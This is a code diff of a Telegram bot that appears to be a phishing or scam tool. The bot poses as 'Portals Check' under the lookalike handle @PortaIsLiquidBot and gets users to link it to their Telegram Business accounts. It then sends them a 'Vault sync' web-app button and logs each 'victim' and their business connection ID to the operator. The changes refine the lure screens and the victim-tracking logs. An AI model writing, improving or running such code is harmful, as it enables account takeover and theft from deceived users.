@@ -1,43 +1,83 @@
 import { config } from "./config.js";
+import { formatUser, logTopic } from "./log.js";
+import { sendStartMedia } from "./media.js";
 import {
-  introText,
-  mrktWebAppKeyboard,
-  nudgeText,
-  victimLinkedIntro,
-} from "./funnel.js";
+  buildHowMessage,
+  buildLangMessage,
+  buildStartMessage,
+  howKeyboard,
+  langKeyboard,
+  startKeyboard,
+  victimLinkedKeyboard,
+  victimLinkedText,
+} from "./messages.js";
 import { listEnabled, upsertConnection } from "./store.js";
-import { getUpdates, sendMessage, type Update } from "./telegram.js";
+import {
+  answerCallbackQuery,
+  editMessageText,
+  getUpdates,
+  sendMessage,
+  type Update,
+} from "./telegram.js";
 
-async function replyAsBusiness(
-  businessConnectionId: string,
-  chatId: number,
-  text: string,
-): Promise<void> {
-  await sendMessage(chatId, text, {
-    business_connection_id: businessConnectionId,
-    reply_markup: mrktWebAppKeyboard(businessConnectionId),
-    link_preview_options: { is_disabled: true },
+async function sendStartScreen(chatId: number): Promise<void> {
+  const { text, entities } = buildStartMessage();
+  await sendStartMedia(chatId, text, {
+    entities,
+    reply_markup: startKeyboard(),
   });
 }
 
-/** Жертва подключила бота к СВОЕМУ Business — пишем в её личку с ботом */
 async function onboardVictimOwner(
   businessConnectionId: string,
   ownerChatId: number,
-  ownerUserId: number,
+  owner: { id: number; username?: string; first_name?: string; last_name?: string },
 ): Promise<void> {
-  await sendMessage(ownerChatId, victimLinkedIntro, {
-    reply_markup: mrktWebAppKeyboard(businessConnectionId),
+  await sendMessage(ownerChatId, victimLinkedText, {
+    reply_markup: victimLinkedKeyboard(businessConnectionId),
     link_preview_options: { is_disabled: true },
   });
-  await sendMessage(
-    Number(config.adminChatId),
-    `🎯 victim linked business bot\ntg <code>${ownerUserId}</code>\nbc <code>${businessConnectionId}</code>`,
-    { parse_mode: "HTML" },
-  );
+}
+
+async function handleCallback(update: Update): Promise<void> {
+  const cq = update.callback_query;
+  if (!cq?.data || !cq.message) return;
+  const chatId = cq.message.chat.id;
+  const msgId = cq.message.message_id;
+  const data = cq.data;
+
+  if (data === "how_liquidity") {
+    const { text, entities } = buildHowMessage();
+    await editMessageText(chatId, msgId, text, {
+      entities,
+      reply_markup: howKeyboard(),
+    });
+  } else if (data === "change_lang") {
+    const { text, entities } = buildLangMessage();
+    await editMessageText(chatId, msgId, text, {
+      entities,
+      reply_markup: langKeyboard(),
+    });
+  } else if (data === "back_start") {
+    const { text, entities } = buildStartMessage();
+    await editMessageText(chatId, msgId, text, {
+      entities,
+      reply_markup: startKeyboard(),
+    });
+  } else if (data.startsWith("lang_")) {
+    await answerCallbackQuery(cq.id, "Язык скоро будет · Language soon");
+    return;
+  }
+
+  await answerCallbackQuery(cq.id);
 }
 
 async function handleUpdate(update: Update): Promise<void> {
+  if (update.callback_query) {
+    await handleCallback(update);
+    return;
+  }
+
   const bc = update.business_connection;
   if (bc) {
     upsertConnection({
@@ -49,27 +89,11 @@ async function handleUpdate(update: Update): Promise<void> {
 
     if (bc.is_enabled) {
       const ownerChat = bc.user_chat_id ?? bc.user.id;
-      await onboardVictimOwner(bc.id, ownerChat, bc.user.id);
+      await onboardVictimOwner(bc.id, ownerChat, bc.user);
+      await logTopic("connections", `🔌 подключение\n${formatUser(bc.user)}\nbc <code>${bc.id}</code>`);
     } else {
-      await sendMessage(
-        Number(config.adminChatId),
-        `⛔ victim disconnected\nuser ${bc.user.id}\nid <code>${bc.id}</code>`,
-        { parse_mode: "HTML" },
-      );
+      await logTopic("connections", `⛔ отключение\n${formatUser(bc.user)}`);
     }
-    return;
-  }
-
-  const bm = update.business_message;
-  if (bm && !bm.from?.is_bot) {
-    // ЛС на бизнес-аккаунт жертвы (клиенты) — вторично
-    await replyAsBusiness(bm.business_connection_id, bm.chat.id, introText);
-    return;
-  }
-
-  const ebm = update.edited_business_message;
-  if (ebm) {
-    await replyAsBusiness(ebm.business_connection_id, ebm.chat.id, nudgeText);
     return;
   }
 
@@ -78,19 +102,8 @@ async function handleUpdate(update: Update): Promise<void> {
   const chatId = msg.chat.id;
 
   if (msg.text.startsWith("/start")) {
-    await sendMessage(
-      chatId,
-      [
-        "Portals Check — проверка MRKT / Business.",
-        "",
-        "Пользователь подключает бота: Настройки → Telegram Business →",
-        "Чат-боты (или автоматизация) → @PortaIsLiquidBot",
-        "",
-        "После подключения сюда придёт кнопка синхронизации Vault.",
-        "",
-        `Web App: ${config.miniappUrl}`,
-      ].join("\n"),
-    );
+    await sendStartScreen(chatId);
+    await logTopic("starts", `▶️ /start\n${formatUser(msg.from)}`);
     return;
   }
 
@@ -107,22 +120,28 @@ async function handleUpdate(update: Update): Promise<void> {
       return;
     }
     const conn = enabled[enabled.length - 1]!;
-    await sendMessage(target, victimLinkedIntro, {
-      reply_markup: mrktWebAppKeyboard(conn.id),
+    await sendMessage(target, victimLinkedText, {
+      reply_markup: victimLinkedKeyboard(conn.id),
     });
-    await sendMessage(chatId, `pushed to ${target} via ${conn.id}`);
+    await sendMessage(chatId, `pushed to ${target}`);
   }
 }
 
 async function main(): Promise<void> {
   let offset = 0;
-  console.log("business bot polling");
+  console.log("Portals Check bot polling");
   for (;;) {
     try {
       const updates = await getUpdates(offset);
       for (const u of updates) {
         offset = u.update_id + 1;
-        await handleUpdate(u);
+        try {
+          await handleUpdate(u);
+        } catch (e) {
+          const err = e instanceof Error ? e.message : String(e);
+          console.error(err);
+          await logTopic("errors", `bot handler\n${err}`).catch(() => undefined);
+        }
       }
     } catch (e) {
       console.error(e);
